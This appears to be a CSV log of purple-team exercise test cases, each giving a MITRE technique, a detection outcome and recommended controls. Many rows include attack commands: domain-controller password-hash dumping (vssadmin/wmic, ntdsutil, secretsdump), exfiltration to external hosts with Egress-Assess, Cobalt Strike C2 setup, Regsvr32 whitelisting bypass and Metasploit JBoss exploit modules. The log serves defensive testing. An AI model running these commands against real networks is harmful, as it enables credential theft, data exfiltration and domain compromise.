Enterprise Purple – 2018 Q3,Suspicious Process Execution,Exploitation,Process Creation Using Regsvr32,T1218.010,,Trusted Windows Binary,Completed,Detected,High,No,TBD,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection","DoDonpachi,Donpachi,Progear",2018-08-12T23:41:50.717Z,1534117310717,2018-08-13T01:24:43.717Z,1534123483717,2019-01-28T19:02:13.041Z,1548702133041,Security Risk Advisors,,Spawn a new process to bypass application whitelisting controls with Regsvr32 (Squiblydoo).,regsvr32 /s /n /u /i:<path to scriptlet> scrobj.dll,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2018 Q3,Network MiTM,Exploitation,LLMNR,T1557.001,,Network spoofing,Completed,Blocked,TBD,No,No,,1) Rogue device triggers alert from NAC solution or potential UEBA tool when broadcasting lots of traffic.,,,"Network Isolation,Secure Baselines,Behavior Analytics",Secure Configs,2018-08-16T14:19:24.717Z,1534429164717,2018-08-16T14:24:33.717Z,1534429473717,2019-01-28T19:07:42.774Z,1548702462774,Security Risk Advisors,,"Respond to local network queries for systems over LLMNR and NetBIOS, obtain domain user password hashes and clear text credentials.",,,High,High,Internal,Medium,,,,Responder
Enterprise Purple – 2018 Q3,Network MiTM,Exploitation,Unencrypted Windows Update,T1040,,Network spoofing,Completed,Blocked,TBD,No,TBD,,,,,Secure Baselines,Secure Configs,2018-08-16T10:25:32.717Z,1534415132717,2018-08-16T10:57:44.717Z,1534417064717,2018-08-16T12:23:25.717Z,1534422205717,Security Risk Advisors,,Intercept Windows Updates on the target laptop in order to run a malicious binary,./wsuxploit.sh <TARGET_IP> <WSUS_IP> <WSUS_PORT> <BINARY_PATH>,,High,High,Internal,Medium,,,,
Enterprise Purple – 2018 Q3,Network MiTM,Exploitation,Basic Auth & WPAD,T1040,,Network spoofing,Completed,Blocked,TBD,No,TBD,,1) Rogue device triggers alert from NAC solution or potential UEBA tool when broadcasting lots of traffic.,,,"Network Isolation,Secure Baselines,Behavior Analytics",Secure Configs,2018-08-16T18:17:53.717Z,1534443473717,2018-08-16T19:29:56.717Z,1534447796717,2018-08-16T19:36:06.717Z,1534448166717,Security Risk Advisors,,"Respond to local network queries for systems over LLMNR and NetBIOS, obtain domain user password hashes and clear text credentials",,,High,High,Internal,Medium,,,,Responder
Enterprise Purple – 2018 Q3,Network MiTM,Exploitation,Inveigh,T1557.001,,Network Spoofing,Completed,Blocked,TBD,No,No,,1) Rogue device triggers alert from NAC solution or potential UEBA tool when broadcasting lots of traffic.,,,"Network Isolation,Secure Baselines,Behavior Analytics",Secure Configs,2018-08-16T16:31:31.717Z,1534437091717,2018-08-16T16:54:16.717Z,1534438456717,2019-01-28T19:07:56.523Z,1548702476523,Security Risk Advisors,,Run the powershell inveigh toolset via a beacon.,Invoke-Inveigh  NBNS - Y,,Low,Low,Internal,Low,,,,
Enterprise Purple – 2018 Q3,Data Exfil Methods - Network,Exfiltration,Extract sensitive data over SSH/SCP/SFTP protocol,T1048,,Exfil data using common network protocols,Completed,Blocked,TBD,No,Yes,,,,,"DLP,Firewall",MUSHA,2018-08-21T00:28:12.717Z,1534811292717,2018-08-21T01:31:23.717Z,1534815083717,2019-01-28T19:12:43.696Z,1548702763696,Security Risk Advisors,,Extract data from the network over HTTP tcp/22 to external host or IP.,"# FTP Server
./Egress-Assess.py --server sftp --username <username> --password <password>

# FTP Client
Invoke-EgressAssess -Client SFTP -IP <IP or Domain> -Datatype <Data Type> -Size 20 -Loops 5 -Fast -Verbose -NoPing -Username <username> -Password <password>",,High,High,Both,Low,,,,Egress-Assess
Enterprise Purple – 2018 Q3,Data Exfil Methods - Network,Exfiltration,Extract sensitive data over established HTTPS C2,T1041,,Exfil data using common network protocols,Completed,Detected,Info,TBD,No,,1) HTTPS / SSL/TLS decryption is enabled in proxy or firewall appliances,,,"Web Gateway,DLP,Firewall",Batrider,2018-08-21T06:54:00.717Z,1534834440717,2018-08-21T08:36:26.717Z,1534840586717,2019-01-28T19:35:38.432Z,1548704138432,Security Risk Advisors,,Extract data from the network over HTTP tcp/443 to external host or IP.,"# HTTPS Server
./Egress-Assess.py --server https

# HTTPS Client
Invoke-EgressAssess -Client HTTPS -IP <IP or Domain> -Datatype <Data Type> -Size 20 -Loops 5 -Fast -Verbose -NoPing",,High,High,Both,Low,,,,Egress-Assess
Enterprise Purple – 2018 Q3,Data Exfil Methods - Network,Exfiltration,Extract sensitive data over established HTTP C2,T1041,,Exfil data using common network protocols,Completed,Detected,Info,TBD,No,,,,,"Web Gateway,DLP,Firewall",Batrider,2018-08-21T05:05:43.717Z,1534827943717,2018-08-21T06:20:14.717Z,1534832414717,2019-01-28T19:35:19.538Z,1548704119538,Security Risk Advisors,,Extract data from the network over HTTP tcp/80 to external host or IP.,,,High,High,Both,Low,,,,Egress-Assess
Enterprise Purple – 2018 Q3,Data Exfil Methods - Network,Exfiltration,Extract sensitive data over FTP protocol,T1048,,Exfil data using common network protocols,Completed,Blocked,TBD,No,TBD,,1) Sensitive data sent over common network protocol is detected by proxy or DLP tool,,,"DLP,Firewall",MUSHA,2018-08-20T19:09:21.717Z,1534792161717,2018-08-20T21:04:13.717Z,1534799053717,2018-08-20T22:38:33.717Z,1534804713717,Security Risk Advisors,,Extract data from the network over HTTP tcp/21 to external host or IP.,,,High,High,Both,Low,,,,Egress-Assess
Enterprise Purple – 2019 Q1,Data Exfil Methods - Network,Exfiltration,Extract sensitive data over SSH/SCP/SFTP protocol,T1048,,Exfil data using common network protocols,Completed,Blocked,TBD,No,Yes,,,,,"DLP,Firewall",MUSHA,2019-01-20T13:01:49.197Z,1547989309197,2019-01-20T13:28:36.197Z,1547990916197,2019-01-28T22:33:20.718Z,1548714800718,Security Risk Advisors,,Extract data from the network over HTTP tcp/22 to external host or IP.,"# FTP Server
./Egress-Assess.py --server sftp --username <username> --password <password>

# FTP Client
Invoke-EgressAssess -Client SFTP -IP <IP or Domain> -Datatype <Data Type> -Size 20 -Loops 5 -Fast -Verbose -NoPing -Username <username> -Password <password>",,High,High,Both,Low,,,,Egress-Assess
Enterprise Purple – 2019 Q1,Data Exfil Methods - Network,Exfiltration,Extract sensitive data over FTP protocol,T1048,,Exfil data using common network protocols,Completed,Blocked,TBD,No,TBD,,1) Sensitive data sent over common network protocol is detected by proxy or DLP tool,,,"DLP,Firewall",MUSHA,2019-01-20T09:20:43.197Z,1547976043197,2019-01-20T11:07:16.197Z,1547982436197,2019-01-20T12:38:41.197Z,1547987921197,Security Risk Advisors,,Extract data from the network over HTTP tcp/21 to external host or IP.,,,High,High,Both,Low,,,,Egress-Assess
Enterprise Purple – 2019 Q1,Data Exfil Methods - Network,Exfiltration,Extract sensitive data over established HTTPS C2,T1041,,Exfil data using common network protocols,Completed,Detected,Low,TBD,No,,1) HTTPS / SSL/TLS decryption is enabled in proxy or firewall appliances,,,"Web Gateway,DLP,Firewall",Batrider,2019-01-20T18:51:30.197Z,1548010290197,2019-01-20T19:02:03.197Z,1548010923197,2019-01-28T22:33:58.589Z,1548714838589,Security Risk Advisors,,Extract data from the network over HTTP tcp/443 to external host or IP.,"# HTTPS Server
./Egress-Assess.py --server https

# HTTPS Client
Invoke-EgressAssess -Client HTTPS -IP <IP or Domain> -Datatype <Data Type> -Size 20 -Loops 5 -Fast -Verbose -NoPing",,High,High,Both,Low,,,,Egress-Assess
Enterprise Purple – 2019 Q1,Data Exfil Methods - Network,Exfiltration,Extract sensitive data over established HTTP C2,T1041,,Exfil data using common network protocols,Completed,Detected,Info,TBD,TBD,,,,,"Web Gateway,DLP,Firewall",Batrider,2019-01-20T16:08:24.197Z,1548000504197,2019-01-20T16:31:34.197Z,1548001894197,2019-01-20T17:11:39.197Z,1548004299197,Security Risk Advisors,,Extract data from the network over HTTP tcp/80 to external host or IP.,,,High,High,Both,Low,,,,Egress-Assess
Enterprise Purple – 2019 Q1,Domain Controller Assault,Lateral Movement,Extract Password Hashes via VSS,T1003,,Compromise a DC,Completed,Detected,Critical,TBD,No,,1) EDR and/or SIEM rules are configured to detect malicious use of Volume Shadow Copy and related system utilities/commands to extract the NTDS.dit,,,"SIEM,EDR","Guwange,DoDonpachi",2019-01-18T10:33:14.197Z,1547807594197,2019-01-18T11:18:58.197Z,1547810338197,2019-01-28T22:43:11.277Z,1548715391277,Security Risk Advisors,,Dump domain hashes for all domain users on the domain controller via VSS (Volume Shadow Services).,"wmic /node:DC /user:DOMAIN\User /password:UserPassword process call create ""cmd /c vssadmin list shadows 2>&1 > C:\Temp\output.txt""
wmic /node:DC /user:DOMAIN\User /password:UserPassword process call create ""cmd /c vssadmin create shadow /for=C: 2>&1 > C:\Temp\output.txt""
wmic /node:DC /user:DOMAIN\User /password:UserPassword process call create ""cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM C:\Temp\SYSTEM.hive 2>&1 > C:\Temp\output.txt""
wmic /node:DC /user:DOMAIN\User /password:UserPassword process call create ""cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\NTDS\ ntds.dit C:\Temp\NTDS.dit 2>&1 > C:\Temp\output.txt""",,Medium,High,Internal,Medium,,,,Native Windows Commands
Enterprise Purple – 2019 Q1,Domain Controller Assault,Command & Control,Beacon HTTP payload on a DC,T1571,,C2 channel,Completed,Blocked,TBD,No,No,,1) C2 beacon from DC is detected and blocked by EDR or network behavioral analysis tool,,,"EDR,Behavior Analytics",MUSHA,2019-01-18T03:59:40.197Z,1547783980197,2019-01-18T05:01:07.197Z,1547787667197,2019-01-28T22:28:34.555Z,1548714514555,Security Risk Advisors,,"Establish an command-and-control beacon from a compromised DC, to other staging hosts on the internal network and potentially direct outbound connection to an external system.",Start http listener and generate a payload from Attacks -> Packages,,Low,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Domain Controller Assault,Lateral Movement,Interactive Logon to a DC,T1078,,Compromise a DC,Completed,Detected,Med,TBD,Yes,,"1) SIEM rules are configured to detect unusual logons to DCs from domain admin users and service accounts, potential detection of anomalous system access from UEBA tool",,,"SIEM,Behavior Analytics",Progear,2019-01-17T17:30:07.197Z,1547746207197,2019-01-17T18:41:50.197Z,1547750510197,2019-01-28T22:43:43.973Z,1548715423973,Security Risk Advisors,,Perform anomalous interactive logons to a DC from privileged user and service accounts.  Once logged in establish persistent remote shell.,Use RDP to access DC and set up persistence,,Medium,High,Internal,Low,,,,
Enterprise Purple – 2019 Q1,Domain Controller Assault,Lateral Movement,Extract Password Hashes via NTDSUtil,T1003,,Compromise a DC,Completed,Detected,Critical,TBD,No,,1) EDR and/or SIEM rules are configured to detect malicious use of Volume Shadow Copy and related system utilities/commands to extract the NTDS.dit,,,"SIEM,EDR","Guwange,DoDonpachi",2019-01-18T06:19:18.197Z,1547792358197,2019-01-18T07:20:52.197Z,1547796052197,2019-01-28T22:42:46.213Z,1548715366213,Security Risk Advisors,,Dump domain hashes for all domain users on the domain controller via NTDSUtils.,ntdsutil “ac in ntds” “ifm” “cr fu \\yourip\tmp” q q,,Medium,High,Internal,Medium,,,,Native Windows Commands
Enterprise Purple – 2019 Q1,Domain Controller Assault,Lateral Movement,Extract password hashes from DC using DC replication / DCSync,T1003,,Compromise a DC,Completed,NotDetected,TBD,TBD,No,,1) EDR and/or SIEM rules are configured to detect malicious use of Volume Shadow Copy and related system utilities/commands to extract the NTDS.dit,,,"SIEM,EDR",,2019-01-18T08:10:51.197Z,1547799051197,2019-01-18T09:37:09.197Z,1547804229197,2019-01-18T10:01:08.197Z,1547805668197,Security Risk Advisors,,Dump domain hashes for all domain users on the domain controller.,"Using impacket:
python secretsdump.py -just-dc DOMAIN/USER:PASSWORD@<DC IP>",,Medium,High,Internal,High,,,,
Enterprise Purple – 2019 Q1,Domain Controller Assault,Command & Control,Beacon SMB payload on a DC,T1571,,C2 channel,Completed,Detected,Low,TBD,No,,1) C2 beacon from DC is detected and blocked by EDR or network behavioral analysis tool,,,"EDR,Behavior Analytics",Batrider,2019-01-17T23:34:09.197Z,1547768049197,2019-01-18T00:49:08.197Z,1547772548197,2019-01-28T22:28:09.067Z,1548714489067,Security Risk Advisors,,"Establish an command-and-control beacon from a compromised DC, to other staging hosts on the internal network and potentially direct outbound connection to an external system.",Generate SMB beacon and run on DC,,Low,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Domain Controller Assault,Lateral Movement,Extract password hashes from DC by copying NTDS.dit,T1003,,Compromise a DC,Completed,Detected,Critical,TBD,No,,1) EDR and/or SIEM rules are configured to detect malicious use of Volume Shadow Copy and related system utilities/commands to extract the NTDS.dit,,,"SIEM,EDR,Endpoint Protection","Guwange,DoDonpachi",2019-01-17T19:29:22.197Z,1547753362197,2019-01-17T21:23:34.197Z,1547760214197,2019-01-28T22:43:29.852Z,1548715409852,Security Risk Advisors,,Dump domain hashes for all domain users on the domain controller.,"wmic /node:DC /user:DOMAIN\User /password:UserPassword process call create ""cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\NTDS\ ntds.dit C:\Temp\NTDS.dit 2>&1 > C:\Temp\output.txt""",,Medium,High,Internal,Medium,,,,SMBexec
Enterprise Purple – 2019 Q1,NAC Bypass,Exploitation,Static IP Address,,,NAC bypass,Completed,Detected,Low,TBD,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,Radiant Silvergun,2019-01-16T01:39:23.197Z,1547602763197,2019-01-16T02:17:18.197Z,1547605038197,2019-01-28T22:22:13.112Z,1548714133112,Security Risk Advisors,,Set a static IP address on the attack host to bypass any network restrictions.,Change ip address of network adapter to a static address,,High,High,Internal,Medium,,,,Manual Techniques
Enterprise Purple – 2019 Q1,NAC Bypass,Exploitation,PC MAC Address,,,NAC bypass,Completed,Blocked,TBD,Yes,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,Radiant Silvergun,2019-01-15T21:18:42.197Z,1547587122197,2019-01-15T21:32:05.197Z,1547587925197,2019-01-28T22:23:16.615Z,1548714196615,Security Risk Advisors,,Change the MAC address to a PC manufacturer code.,,,High,High,Internal,Medium,,,,Manual Techniques
Enterprise Purple – 2019 Q1,NAC Bypass,Exploitation,Printer MAC Address,,,NAC bypass,Completed,Blocked,TBD,Yes,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,Radiant Silvergun,2019-01-15T14:19:43.197Z,1547561983197,2019-01-15T15:04:37.197Z,1547564677197,2019-01-28T22:22:49.477Z,1548714169477,Security Risk Advisors,,Change the MAC address to a printer manufacturer code.,"#Linux
macchanger -m <MAC> <Interface>
#Windows
Device Manager -> Network Adapters -> Advanced
Look for Locally Administrative Address or Network Address and change the value for that (No : needed)",,High,High,Internal,Medium,,,,Manual Techniques
Enterprise Purple – 2019 Q1,NAC Bypass,Exploitation,Apple MAC Address,,,NAC bypass,Completed,Blocked,TBD,Yes,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,Radiant Silvergun,2019-01-15T23:23:13.197Z,1547594593197,2019-01-15T23:23:47.197Z,1547594627197,2019-01-28T22:23:31.604Z,1548714211604,Security Risk Advisors,,Change the MAC address to a Apple manufacturer code.,"Disable wifi and run the following:
sudo ifconfig en0 ether <New_Mac_Address>",,High,High,Internal,Medium,,,,Manual Techniques
Enterprise Purple – 2019 Q1,NAC Bypass,Exploitation,Unusual MAC Address,,,NAC bypass,Completed,Blocked,TBD,Yes,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,Radiant Silvergun,2019-01-15T17:49:23.197Z,1547574563197,2019-01-15T18:40:59.197Z,1547577659197,2019-01-28T22:23:01.416Z,1548714181416,Security Risk Advisors,,Change the MAC address to an unusual manufacturer code.,"In device manager, change the network adapter's mac address value",,High,High,Internal,Medium,,,,Manual Techniques
Enterprise Purple – 2019 Q1,NAC Bypass,Exploitation,Raspberry Pi,,,NAC bypass,Completed,Blocked,TBD,Yes,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,Radiant Silvergun,2019-01-15T06:28:11.197Z,1547533691197,2019-01-15T07:37:35.197Z,1547537855197,2019-01-28T22:22:26.092Z,1548714146092,Security Risk Advisors,,Connect an untrusted device to the network to exploit NAC controls.,Connect raspberry pi into a wall jack.,,Low,High,Internal,Medium,,,,Manual Techniques
Enterprise Purple – 2019 Q1,NAC Bypass,Exploitation,Network Device MAC Address,,,NAC bypass,Completed,Blocked,TBD,Yes,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,Radiant Silvergun,2019-01-15T10:21:18.197Z,1547547678197,2019-01-15T12:15:11.197Z,1547554511197,2019-01-28T22:22:38.103Z,1548714158103,Security Risk Advisors,,Change the MAC address to a network device manufacturer code.,Use device manager and change the mac address value for network adapter,,High,High,Internal,Medium,,,,"Manual Techniques,Native Windows Commands"
Enterprise Purple – 2019 Q1,NAC Bypass,Discovery,Passive Network Recon,T1049,,Passive network recon,Completed,Detected,Low,TBD,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,"Network Isolation,Behavior Analytics",Radiant Silvergun,2019-01-15T04:10:40.197Z,1547525440197,2019-01-15T05:24:25.197Z,1547529865197,2019-01-28T22:21:41.410Z,1548714101410,Security Risk Advisors,,"Obtain information from the network including MAC addresses, valid IP addresses, and hostnames.",,,High,High,Internal,High,,,,"Manual Techniques,Native Windows Commands"
Enterprise Purple – 2019 Q1,External Automated Scans,Reconnaissance,Application Vulnerability Scan - TARGET 2,T1046,,Vulnerability scanning,Completed,NotDetected,TBD,TBD,Yes,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall to alert on high volume scan activity.",,,"Firewall,WAF",,2019-01-04T14:18:48.197Z,1546611528197,2019-01-04T14:50:19.197Z,1546613419197,2019-01-04T14:58:09.197Z,1546613889197,Security Risk Advisors,,"Launch a application vulnerability scan against targeted application, creating an excessive amount of traffic originating from a single source.",Run active scans using Burp or other web application scanning tools,,High,Medium,Both,Low,,,,BurpSuite
Enterprise Purple – 2019 Q1,External Automated Scans,Reconnaissance,Network Vulnerability Scan - External IP Ranges,T1046,,Vulnerability scanning,Completed,Detected,Med,TBD,TBD,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall to alert on high volume scan activity.",,,"Firewall,WAF","MUSHA,Gunbird",2019-01-04T15:54:27.197Z,1546617267197,2019-01-04T16:18:44.197Z,1546618724197,2019-01-04T17:45:26.197Z,1546623926197,Security Risk Advisors,,"Launch a application vulnerability scan against targeted application, creating an excessive amount of traffic originating from a single source.",,,High,Medium,Both,Low,,,,Nessus
Enterprise Purple – 2019 Q1,External Automated Scans,Reconnaissance,Application Vulnerability Scan - TARGET 1,T1046,,Vulnerability scanning,Completed,Detected,High,TBD,Yes,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall to alert on high volume scan activity.",,,"Firewall,WAF","MUSHA,Gunbird",2019-01-04T12:17:59.197Z,1546604279197,2019-01-04T12:38:16.197Z,1546605496197,2019-01-28T22:40:37.970Z,1548715237970,Security Risk Advisors,,"Launch a application vulnerability scan against targeted application, creating an excessive amount of traffic originating from a single source.",Run active scans using Burp or other web application scanning tools,,High,Medium,Both,Low,,,,BurpSuite
Enterprise Purple – 2019 Q1,Data Exfil Methods - Email and USB,Exfiltration,Suspicious use of makecab,,,Data compression,Completed,NotDetected,TBD,TBD,No,,1) Suspicious use of makecab is detected by EDR and/or SIEM tool,,,"SIEM,EDR",,2019-01-19T11:41:46.197Z,1547898106197,2019-01-19T13:07:08.197Z,1547903228197,2019-01-19T13:15:23.197Z,1547903723197,Security Risk Advisors,,Using the built in makecab tool to compress files prior to exfiltration.,"makecab ""important_file.txt"" ""not_important_file.cab"" /L ""C:\Temp""",,Low,Low,Internal,Low,,,,Manual Techniques
Enterprise Purple – 2019 Q1,Data Exfil Methods - Email and USB,Exfiltration,Extract data via an unencrypted zip or rar file on USB Drive,T1052,,Exfil data with USB drive,Completed,Blocked,TBD,Yes,TBD,,,,,"DLP,Secure Baselines","Spriggan,Ketsui",2019-01-19T06:48:37.197Z,1547880517197,2019-01-19T07:13:17.197Z,1547881997197,2019-01-19T09:04:38.197Z,1547888678197,Security Risk Advisors,,Put unencrypted zip on USB drive,,,High,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2019 Q1,Data Exfil Methods - Email and USB,Exfiltration,Extract data via encrypted zip or rar file via email,T1560,,Exfil data using email,Completed,NotDetected,TBD,TBD,Yes,,,,,"Email Gateway,DLP",,2019-01-20T03:21:22.197Z,1547954482197,2019-01-20T03:45:33.197Z,1547955933197,2019-01-20T03:51:46.197Z,1547956306197,Security Risk Advisors,,"Send encrypted zip or rar using Outlook, Gmail, or other popular mail program.",Zip or rar sensitive data and send that file using email to an external email address.,,High,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2019 Q1,Data Exfil Methods - Email and USB,Exfiltration,Extract data using popular sites,T1048,,Exfil data using popular websites,Completed,Blocked,TBD,No,No,,"1) Connections to popular online sites/cloud storage blocked by the proxy or firewall.,2) Attempts to exfil sensitive data over HTTP and HTTPS is detected in-line by DLP tools",,,"Web Gateway,DLP",MUSHA,2019-01-19T14:14:41.197Z,1547907281197,2019-01-19T15:13:16.197Z,1547910796197,2019-01-28T22:30:04.534Z,1548714604534,Security Risk Advisors,,Extract data from the network using popular websites and cloud storage services.,,,High,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2019 Q1,Data Exfil Methods - Email and USB,Exfiltration,Extract data via encrypted zip or rar file on USB Drive,T1052,,Exfil data with USB drive,Completed,Blocked,TBD,Yes,TBD,,,,,"DLP,Secure Baselines","Spriggan,Ketsui",2019-01-19T09:17:42.197Z,1547889462197,2019-01-19T09:24:57.197Z,1547889897197,2019-01-19T10:17:04.197Z,1547893024197,Security Risk Advisors,,"Put encrypted zip or rar on USB drive, using AES encryption or other format.",,,High,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2019 Q1,Data Exfil Methods - Email and USB,Exfiltration,"Email sensitive data to external recipient using automated script (PII, PHI, others)",T1020,,Exfil data using email,Completed,Detected,High,TBD,TBD,,,,,DLP,Spriggan,2019-01-20T05:48:59.197Z,1547963339197,2019-01-20T06:55:51.197Z,1547967351197,2019-01-20T07:28:55.197Z,1547969335197,Security Risk Advisors,,"Email test data to simulate PII, credit card numbers, PHI, etc. leaving the network over email.",Send an email with sensitive data in the body.,,Medium,High,Both,Low,,,,Egress-Assess
Enterprise Purple – 2019 Q1,Data Exfil Methods - Email and USB,Exfiltration,Extract data via unencrypted zip or rar file via email,T1560,,Exfil data using email,Completed,Detected,High,TBD,Yes,,,,,"Email Gateway,DLP",Spriggan,2019-01-19T22:53:05.197Z,1547938385197,2019-01-19T23:50:13.197Z,1547941813197,2019-01-28T22:31:05.110Z,1548714665110,Security Risk Advisors,,"Send encrypted zip or rar using Outlook, Gmail, or other popular mail program.",Zip or rar sensitive data and send that file to external email.,,High,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2019 Q1,Data Exfil Methods - Email and USB,Exfiltration,Email sensitive document to external recipient - Names and DOBs,T1048,,Exfil data using email,Completed,Detected,High,TBD,Yes,,,,,DLP,Spriggan,2019-01-19T17:15:07.197Z,1547918107197,2019-01-19T17:39:34.197Z,1547919574197,2019-01-28T22:30:41.887Z,1548714641887,Security Risk Advisors,,"Email test data to simulate PII, credit card numbers, PHI, etc. leaving the network over email.",Compose email with Names and DOB's and send to an external recipient.,,Medium,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2019 Q1,Data Exfil Methods - Email and USB,Exfiltration,Email sensitive document to external recipient - SSN and CC,T1048,,Exfil data using email,Completed,Detected,High,TBD,Yes,,,,,DLP,Spriggan,2019-01-19T19:52:52.197Z,1547927572197,2019-01-19T20:34:53.197Z,1547930093197,2019-01-28T22:30:52.876Z,1548714652876,Security Risk Advisors,,"Email test data to simulate PII, credit card numbers, PHI, etc. leaving the network over email.",Email an external recipient with an email that contians SSN and CC numbers.,,Medium,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2019 Q1,Malware Profile Simulation,Exploitation,Files with Ransomware Extensions #1,,,Ransomware,Completed,Blocked,High,No,TBD,,,,,"EDR,Endpoint Protection",Ketsui,2019-01-21T08:50:44.197Z,1548060644197,2019-01-21T10:17:38.197Z,1548065858197,2019-01-29T08:36:55.609Z,1548751015609,Security Risk Advisors,,"Generate a large number of files with a ransomware extension

extensions:
- locky
- ykcol","ps> 1..100 | %{new-item -type file -path ""$_.extension""}",,High,High,Both,Low,,,,
Enterprise Purple – 2019 Q1,Malware Profile Simulation,Exploitation,Files with Ransomware Extensions #2,,,Ransomware,Completed,NotDetected,TBD,TBD,No,,,,,"EDR,Endpoint Protection",,2019-01-21T13:31:44.197Z,1548077504197,2019-01-21T14:45:44.197Z,1548081944197,2019-01-21T15:42:41.197Z,1548085361197,Security Risk Advisors,,"Generate a large number of files with a ransomware extension

extension:
- kratos","ps> 1..100 | %{new-item -type file -path ""$_.extension""}",,High,High,Both,Low,,,,
Enterprise Purple – 2019 Q1,Malware Profile Simulation,Exploitation,Malleable C2 Profile Using Cobalt Strike - MALWARE PROFILE 4,T1095,,Malware simulation,Completed,Detected,High,TBD,Yes,,1) Simulated malware network traffic detected by behavioral analytics or firewall gateway,,,"Endpoint Protection,Behavior Analytics","MUSHA,Grind Stormer",2019-01-21T06:21:03.197Z,1548051663197,2019-01-21T08:15:13.197Z,1548058513197,2019-01-28T22:35:28.210Z,1548714928210,Security Risk Advisors,,Startup Cobalt Strike to simulate known malware network profile.,"https://github.com/rsmudge/Malleable-C2-Profiles
./teamserver [external IP] [password] [/path/to/my.profile]",,High,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Malware Profile Simulation,Exploitation,Malleable C2 Profile Using Cobalt Strike - MALWARE PROFILE 2,T1095,,Malware simulation,Completed,Detected,High,TBD,Yes,,1) Simulated malware network traffic detected by behavioral analytics or firewall gateway,,,"Endpoint Protection,Behavior Analytics","MUSHA,Grind Stormer",2019-01-21T00:59:53.197Z,1548032393197,2019-01-21T02:02:27.197Z,1548036147197,2019-01-28T22:34:49.411Z,1548714889411,Security Risk Advisors,,Startup Cobalt Strike to simulate known malware network profile.,"https://github.com/rsmudge/Malleable-C2-Profiles
./teamserver [external IP] [password] [/path/to/my.profile]",,High,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Malware Profile Simulation,Exploitation,Malleable C2 Profile Using Cobalt Strike - MALWARE PROFILE 3,T1095,,Malware simulation,Completed,Detected,High,TBD,Yes,,1) Simulated malware network traffic detected by behavioral analytics or firewall gateway,,,"Endpoint Protection,Behavior Analytics",MUSHA,2019-01-21T03:16:30.197Z,1548040590197,2019-01-21T04:48:29.197Z,1548046109197,2019-01-28T22:35:11.379Z,1548714911379,Security Risk Advisors,,Startup Cobalt Strike to simulate known malware network profile.,"https://github.com/rsmudge/Malleable-C2-Profiles
./teamserver [external IP] [password] [/path/to/my.profile]",,High,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Malware Profile Simulation,Exploitation,Malleable C2 Profile Using Cobalt Strike - MALWARE PROFILE 1,T1095,,Malware simulation,Completed,Detected,High,TBD,Yes,,1) Simulated malware network traffic detected by behavioral analytics or firewall gateway,,,"Endpoint Protection,Behavior Analytics",Grind Stormer,2019-01-20T21:35:50.197Z,1548020150197,2019-01-20T22:10:39.197Z,1548022239197,2019-01-28T22:34:32.231Z,1548714872231,Security Risk Advisors,,Startup Cobalt Strike to simulate known malware network profile.,"https://github.com/rsmudge/Malleable-C2-Profiles
./teamserver [external IP] [password] [/path/to/my.profile]",,High,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,App Server Discovery and Exploitation,Discovery,Targeted Scans and Fuzzing - Target Group 1,T1046,,Web application probing,Completed,Detected,Med,TBD,Yes,,"1) Suspicious internal scanning is detected by firewall/IDS/IPS, UEBA tool, or honeypot technology,2) Event logs for commonly targeted application server platforms are ingested to SIEM for further analysis and alerting on suspicious activity (e.g. intrusion attempts to Tomcat, Jenkins, JBoss, critical business applications, SSO services, etc.)",,,"SIEM,Behavior Analytics",Batrider,2019-01-17T06:33:32.197Z,1547706812197,2019-01-17T07:17:55.197Z,1547709475197,2019-01-28T22:27:13.446Z,1548714433446,Security Risk Advisors,,"Run targeted scanning of dynamic web pages with tools such as Burp's Active Scan to look for common vulnerabilities (e.g. OWASP top 10) including SQLi, command injection, XSS and default credentials on popular application web consoles such as JBoss and Tomcat.",Use burp active scan,,High,High,Internal,Medium,,,,"Manual Techniques,BurpSuite"
Enterprise Purple – 2019 Q1,App Server Discovery and Exploitation,Exploitation,Targeted Scans and Fuzzing - JBoss,T1068,,Web application probing,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious internal scanning is detected by firewall/IDS/IPS, UEBA tool, or honeypot technology,2) Event logs for commonly targeted application server platforms are ingested to SIEM for further analysis and alerting on suspicious activity (e.g. intrusion attempts to Tomcat, Jenkins, JBoss, critical business applications, SSO services, etc.)",,,"SIEM,Behavior Analytics",,2019-01-17T09:15:48.197Z,1547716548197,2019-01-17T11:12:56.197Z,1547723576197,2019-01-17T12:20:16.197Z,1547727616197,Security Risk Advisors,,"Run targeted scanning of dynamic web pages with tools such as Burp's Active Scan to look for common vulnerabilities (e.g. OWASP top 10) including SQLi, command injection, XSS and default credentials on popular application web consoles such as JBoss and Tomcat.","Scanner:
msf> use auxiliary/scanner/http/jboss_vulnscan

JMX Console Deployer Upload and Execute:
msf> use exploit/multi/http/jboss_maindeployer",,High,High,Internal,Medium,,,,"Manual Techniques,BurpSuite"
